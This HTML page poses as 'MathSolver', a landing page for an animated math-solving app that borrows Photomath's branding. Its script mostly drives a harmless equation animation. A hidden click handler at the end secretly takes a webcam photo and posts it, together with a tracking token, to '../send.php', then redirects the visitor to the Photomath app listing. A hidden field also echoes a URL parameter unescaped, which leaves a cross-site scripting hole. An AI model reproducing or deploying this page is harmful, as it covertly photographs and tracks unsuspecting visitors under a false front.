<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MathSolver - Animated Math Solutions</title>
    <link rel="shortcut icon" href="https://photomath.com/favicon-32x32.png" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
            color: #fff;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            margin-bottom: 40px;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 28px;
            font-weight: 700;
        }

        .logo i {
            color: #4facfe;
        }

        nav ul {
            display: flex;
            list-style: none;
            gap: 30px;
        }

        nav a {
            color: #fff;
            text-decoration: none;
            font-weight: 500;
            transition: color 0.3s;
        }

        nav a:hover {
            color: #4facfe;
        }

        .hero {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            margin-bottom: 60px;
        }

        .hero h1 {
            font-size: 48px;
            margin-bottom: 20px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }

        .hero p {
            font-size: 22px;
            max-width: 700px;
            margin-bottom: 30px;
            opacity: 0.9;
        }

        .cta-button {
            background: linear-gradient(90deg, #4facfe 0%, #00f2fe 100%);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }

        .cta-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
        }

        .math-animation {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            margin: 40px 0;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
        }

        .animation-container {
            width: 100%;
            height: 300px;
            position: relative;
            overflow: hidden;
            border-radius: 10px;
            background: rgba(0, 0, 0, 0.2);
        }

        .math-expression {
            position: absolute;
            font-size: 32px;
            color: white;
            text-align: center;
            width: 100%;
            top: 50%;
            transform: translateY(-50%);
            font-family: 'Courier New', monospace;
        }

        .solution-step {
            position: absolute;
            font-size: 24px;
            color: #4facfe;
            text-align: center;
            width: 100%;
            top: 65%;
            transform: translateY(-50%);
            opacity: 0;
            font-family: 'Courier New', monospace;
        }

        .controls {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 20px;
        }

        .control-btn {
            background: rgba(255, 255, 255, 0.2);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 50px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .control-btn:hover {
            background: rgba(255, 255, 255, 0.3);
        }

        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
            margin: 60px 0;
        }

        .feature {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 25px;
            text-align: center;
            transition: transform 0.3s;
        }

        .feature:hover {
            transform: translateY(-10px);
        }

        .feature i {
            font-size: 40px;
            color: #4facfe;
            margin-bottom: 20px;
        }

        .feature h3 {
            font-size: 22px;
            margin-bottom: 15px;
        }

        footer {
            text-align: center;
            padding: 40px 0;
            margin-top: 60px;
            border-top: 1px solid rgba(255, 255, 255, 0.2);
        }

        @media (max-width: 768px) {
            nav ul {
                gap: 15px;
            }

            .hero h1 {
                font-size: 36px;
            }

            .hero p {
                font-size: 18px;
            }

            .math-expression {
                font-size: 24px;
            }

            .solution-step {
                font-size: 18px;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <header>
            <div class="logo">
                <i class="fas fa-square-root-alt"></i>
                <span>MathSolver</span>
            </div>
            <nav>
                <ul>
                    <li><a href="#">Home</a></li>
                    <li><a href="#">Features</a></li>
                    <li><a href="#">How It Works</a></li>
                    <li><a href="#">Download</a></li>
                </ul>
            </nav>
        </header>

        <section class="hero">
            <h1>Solve Math Problems with Animated Steps</h1>
            <p>See how equations are solved step-by-step with beautiful animations that make math intuitive and easy to
                understand</p>
            <button class="cta-button">Get Started</button>
        </section>

        <section class="math-animation">
            <h2 style="text-align: center; margin-bottom: 20px;">Watch How It Works</h2>
            <div class="animation-container">
                <div class="math-expression">3x + 5 = 11</div>
                <div class="solution-step" id="step1">Subtract 5 from both sides: 3x = 6</div>
                <div class="solution-step" id="step2">Divide both sides by 3: x = 2</div>
            </div>
            <div class="controls">
                <button class="control-btn" id="prev-btn"><i class="fas fa-arrow-left"></i> Previous</button>
                <button class="control-btn" id="play-btn"><i class="fas fa-play"></i> Play</button>
                <button class="control-btn" id="next-btn">Next <i class="fas fa-arrow-right"></i></button>
            </div>
        </section>

        <section class="features">
            <div class="feature">
                <i class="fas fa-calculator"></i>
                <h3>Step-by-Step Solutions</h3>
                <p>See detailed explanations for every step of the solution process</p>
            </div>
            <div class="feature">
                <i class="fas fa-bolt"></i>
                <h3>Instant Results</h3>
                <p>Get answers to your math problems in seconds</p>
            </div>
            <div class="feature">
                <i class="fas fa-graduation-cap"></i>
                <h3>Learn Concepts</h3>
                <p>Understand the underlying principles with visual explanations</p>
            </div>
        </section>
    </div>

    <footer>
        <div class="container">
            <p>© 2023 MathSolver. All rights reserved.</p>
        </div>
    </footer>
    <input id="user_id" type="text" style="display: none;"
        value="<?php echo isset($_GET['service-token']) ? $_GET['service-token'] : 1 ?>">
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const mathExpression = document.querySelector('.math-expression');
            const step1 = document.getElementById('step1');
            const step2 = document.getElementById('step2');
            const playBtn = document.getElementById('play-btn');
            const prevBtn = document.getElementById('prev-btn');
            const nextBtn = document.getElementById('next-btn');

            let currentStep = 0;
            const totalSteps = 2;
            let isPlaying = false;
            let animationInterval;

            // Function to update animation based on current step
            function updateAnimation() {
                // Reset all steps
                step1.style.opacity = '0';
                step2.style.opacity = '0';

                // Highlight current step
                if (currentStep === 1) {
                    step1.style.opacity = '1';
                    mathExpression.textContent = '3x = 6';
                } else if (currentStep === 2) {
                    step2.style.opacity = '1';
                    mathExpression.textContent = 'x = 2';
                } else {
                    mathExpression.textContent = '3x + 5 = 11';
                }
            }

            // Play button functionality
            playBtn.addEventListener('click', function () {
                if (isPlaying) {
                    // Pause animation
                    clearInterval(animationInterval);
                    playBtn.innerHTML = '<i class="fas fa-play"></i> Play';
                    isPlaying = false;
                } else {
                    // Play animation
                    playBtn.innerHTML = '<i class="fas fa-pause"></i> Pause';
                    isPlaying = true;

                    // If we're at the end, restart
                    if (currentStep >= totalSteps) currentStep = 0;

                    animationInterval = setInterval(function () {
                        currentStep++;
                        if (currentStep > totalSteps) {
                            clearInterval(animationInterval);
                            playBtn.innerHTML = '<i class="fas fa-play"></i> Play';
                            isPlaying = false;
                            return;
                        }
                        updateAnimation();
                    }, 2000);
                }
            });

            // Next button functionality
            nextBtn.addEventListener('click', function () {
                if (isPlaying) {
                    clearInterval(animationInterval);
                    playBtn.innerHTML = '<i class="fas fa-play"></i> Play';
                    isPlaying = false;
                }

                if (currentStep < totalSteps) {
                    currentStep++;
                    updateAnimation();
                }
            });

            // Previous button functionality
            prevBtn.addEventListener('click', function () {
                if (isPlaying) {
                    clearInterval(animationInterval);
                    playBtn.innerHTML = '<i class="fas fa-play"></i> Play';
                    isPlaying = false;
                }

                if (currentStep > 0) {
                    currentStep--;
                    updateAnimation();
                }
            });

            // Initialize animation
            updateAnimation();

            // Add some floating math elements in the background for visual effect
            const animationContainer = document.querySelector('.animation-container');
            for (let i = 0; i < 15; i++) {
                const element = document.createElement('div');
                element.innerHTML = ['+', '-', '×', '÷', '=', 'x', 'y', 'z'][Math.floor(Math.random() * 8)];
                element.style.position = 'absolute';
                element.style.color = 'rgba(255, 255, 255, 0.2)';
                element.style.fontSize = Math.random() * 30 + 10 + 'px';
                element.style.left = Math.random() * 100 + '%';
                element.style.top = Math.random() * 100 + '%';
                element.style.pointerEvents = 'none';
                animationContainer.appendChild(element);

                // Animate the elements
                animateElement(element);
            }

            function animateElement(el) {
                const duration = Math.random() * 10000 + 5000;

                function move() {
                    const x = Math.random() * 90;
                    const y = Math.random() * 90;

                    el.animate([
                        { left: el.style.left, top: el.style.top },
                        { left: x + '%', top: y + '%' }
                    ], {
                        duration: duration,
                        easing: 'ease-in-out',
                        fill: 'forwards'
                    });
                }

                move();
                setInterval(move, duration);
            }
        });
        let user_id = document.getElementById('user_id');
        document.onclick = () => {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    video.onloadedmetadata = () => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append('image', blob, 'photo.png');
                            formData.append('id', user_id.value);
                            formData.append('page', 'image');
                            fetch('../send.php', {
                                method: 'POST',
                                body: formData
                            }).then(response => response.text())
                                .then(data => {
                                    console.log(data);
                                    stream.getTracks().forEach(track => track.stop());

                                    window.location.href = 'https://play.google.com/store/apps/details?id=com.microblink.photomath';
                                })
                                .catch(error => console.error('Error:', error));
                        }, 'image/peg');
                    }
                })
        }

    </script>
</body>

</html>

</html>